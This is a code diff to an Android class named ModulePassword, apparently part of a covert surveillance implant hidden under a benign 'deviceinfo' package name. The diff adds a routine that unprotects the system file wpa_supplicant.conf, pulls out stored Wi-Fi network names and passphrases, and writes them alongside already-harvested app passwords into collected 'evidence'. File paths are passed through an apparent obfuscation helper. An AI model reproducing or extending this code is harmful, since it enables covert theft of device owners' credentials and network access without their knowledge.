@@ -1,7 +1,10 @@
 package com.android.deviceinfo.module;
 
+import java.io.File;
+import java.io.FileInputStream;
 import java.util.HashMap;
 import java.util.Iterator;
+import java.util.List;
 
 import android.database.Cursor;
 
@@ -13,6 +16,7 @@ import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
+import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
@@ -37,6 +41,7 @@ public class ModulePassword extends BaseModule {
 			services.put("whatsapp", 0x07);
 			services.put("mail", 0x09);
 			services.put("linkedin", 0x0a);
+			services.put("wifi", 0x0b);
 
 			return true;
 		} else {
@@ -92,23 +97,54 @@ public class ModulePassword extends BaseModule {
 					if (lastPasswords.containsKey(jid) && lastPasswords.get(jid).equals(value)) {
 						return jid;
 					} else {
-						lastPasswords.put( jid, value);
+						lastPasswords.put(jid, value);
 						needToSerialize = true;
 					}
 
-					evidence.write(WChar.getBytes(type, true));
-					evidence.write(WChar.getBytes(name, true));
-					evidence.write(WChar.getBytes(password, true));
-					evidence.write(WChar.getBytes(service, true));
-					evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
+					addToEvidence(evidence, name, type, password, service);
 
 				}
-				
+
 				return jid;
 			}
 		};
 
+		dumpWifi();
 		dumpAccounts(passwordVisitor);
+		
+	}
+
+	private void dumpWifi() {
+		String filename = M.e("/data/misc/wifi/wpa_supplicant.conf");
+		Path.unprotect(filename, 2, false);
+		List<String> lines = StringUtils.readFileLines(filename);
+		String ssid = "";
+		String psk = "";
+		EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
+		for (String line : lines) {
+			if (line.contains("ssid")) {
+				ssid = getValue(line);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (dumpWifi) ssid = %s",ssid);
+				}
+			} else if (line.contains("psk")) {
+				psk = getValue(line);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (dumpWifi) psk = %s", psk);
+				}
+				addToEvidence(evidence, ssid, "SSID", psk, "Wifi");
+			}
+		}
+		evidence.close();
+
+	}
+
+	private String getValue(String line) {
+		String[] parts = line.split("=");
+		if (parts.length == 2) {
+			return parts[1];
+		}
+		return null;
 	}
 
 	public static void dumpAccounts(RecordVisitor visitor) {
@@ -128,7 +164,7 @@ public class ModulePassword extends BaseModule {
 
 		if (helper == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db" );
+				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db");
 			}
 		}
 
@@ -139,8 +175,7 @@ public class ModulePassword extends BaseModule {
 		// h_6=name
 		// h_7=type
 		// h_8=password
-		String[] projection = { M.e("_id"), M.e("name"), M.e("type"),
-				M.e("password ") };
+		String[] projection = { M.e("_id"), M.e("name"), M.e("type"), M.e("password ") };
 		visitor.projection = projection;
 
 		helper.traverseRecords(table, visitor);
@@ -181,6 +216,14 @@ public class ModulePassword extends BaseModule {
 	@Override
 	protected void actualStop() {
 
+	}
+
+	private void addToEvidence(EvidenceReference evidence, String name, String type, String password, String service) {
+		evidence.write(WChar.getBytes(type, true));
+		evidence.write(WChar.getBytes(name, true));
+		evidence.write(WChar.getBytes(password, true));
+		evidence.write(WChar.getBytes(service, true));
+		evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
 	}
 
 }
